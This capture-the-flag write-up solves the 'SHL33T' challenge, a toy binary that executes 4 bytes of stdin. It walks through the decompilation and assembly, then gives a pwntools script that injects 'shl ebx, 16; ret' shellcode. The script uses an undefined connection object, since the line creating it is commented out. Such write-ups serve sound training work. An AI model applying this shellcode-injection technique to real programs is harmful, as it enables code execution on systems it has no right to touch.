
---

# SHL33T

> **Description:** The mischievous elves have tampered with Nibbletop’s registers—most notably the EBX register—and now he’s stuck, unable to continue delivering Christmas gifts. Can you step in, restore his register, and save Christmas once again for everyone?

## Analysis

We start by analyzing the provided binary in Ghidra. The `main` function reveals the following logic:

```c
/* WARNING: Removing unreachable block (ram,0x00101ab6) */

undefined8 main(void)

{
  long lVar1;
  code *__buf;
  ssize_t sVar2;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  banner();
  signal(0xb,handler);
  signal(4,handler);
  info("These elves are playing with me again, look at this mess: ebx = 0x00001337\n");
  info("It should be ebx = 0x13370000 instead!\n");
  info("Please fix it kind human! SHLeet the registers!\n\n$ ");
  
  // Allocate executable memory (RWX permissions: 7)
  __buf = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  if (__buf == (code *)0xffffffffffffffff) {
    perror("mmap");
    exit(1);
  }
  
  // Read exactly 4 bytes from stdin
  sVar2 = read(0,__buf,4);
  
  if (0 < sVar2) {
    // Execute the buffer
    (*__buf)();
    
    fail("Christmas is ruined thanks to you and these elves!\n");
    if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
      return 0;
    }
    __stack_chk_fail();
  }
  fail("No input given!\n");
  exit(1);
}

```

The decompilation shows that `mmap` allocates executable memory, and `read` takes exactly **4 bytes** of input which are immediately executed. Ghidra marks some blocks as "unreachable," so we inspect the Assembly to understand what happens after execution.

### Assembly Inspection

```assembly
                             LAB_00101a9a                                    XREF[1]:     00101a7a (j)   
        00101a9a 48  8b  45  d0    MOV        RAX ,qword ptr [RBP  + local_38 ]
        00101a9e 48  89  45  e0    MOV        qword ptr [RBP  + local_28 ],RAX
        00101aa2 48  8b  45  e0    MOV        RAX ,qword ptr [RBP  + local_28 ]
        00101aa6 ff  d0           CALL       RAX                                      ; Call our shellcode
        00101aa8 89  d8           MOV        EAX ,EBX                                 ; Move EBX result to EAX
        00101aaa 89  45  cc       MOV        dword ptr [RBP  + local_3c ],EAX
        00101aad 81  7d  cc       CMP        dword ptr [RBP  + local_3c ],0x13370000  ; Check if result is 0x13370000
                 00  00  37  13
        00101ab4 75  3c           JNZ        LAB_00101af2                             ; Jump if not equal
        00101ab6 48  8d  05       LEA        RAX ,[s_HOORAY!_You_saved_Christmas_agai_00102f 
                 63  14  00  00
        ...
        00101ac5 e8  d4  fb       CALL       success                                  ; Call success function
                 ff  ff
        00101aca 48  8d  05       LEA        RAX ,[s_cat_flag.txt_00102f59 ]          = "cat flag.txt"
                 88  14  00  00
        00101ad1 48  89  c7       MOV        RDI =>s_cat_flag.txt_00102f59 ,RAX       = "cat flag.txt"
        00101ad4 e8  d7  f6       CALL       <EXTERNAL>::system                       int system(char * __command)

```

The assembly confirms the logic:

1. We execute our 4-byte shellcode.
2. The program compares the value of `EBX` to `0x13370000`.
3. If they match, it executes `cat flag.txt`.

## Solution

The description and the check tell us that `EBX` starts as `0x00001337`. We need to transform it into `0x13370000`.

This is a simple bitwise shift operation. By shifting the hex value `1337` to the left by 4 hex digits (which is 16 bits), we move it from the lower half of the register to the upper half.

The instruction `SHL` (Shift Logical Left) is perfect for this. We need to fit this into 4 bytes.

* **Instruction:** `shl ebx, 16`
* **Opcode:** `C1 E3 10` (3 bytes)
* **Return:** `ret` (1 byte)

Total: 4 bytes.

### Exploit Script

```python
from pwn import *

# Target configuration
# p = remote('IP', PORT) 

# SHL ebx, 16 (shift left by 16 bits)
# Opcode: C1 E3 10
shellcode = asm('shl ebx, 16', arch='i386', os='linux')

# Add a return instruction to cleanly exit back to main
shellcode += asm('ret', arch='i386')

print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Shellcode (hex): {shellcode.hex()}")

# Send to the binary
p.sendline(shellcode)
p.interactive()

```

Sending these bytes modifies the register correctly, satisfying the comparison check and printing the flag.

---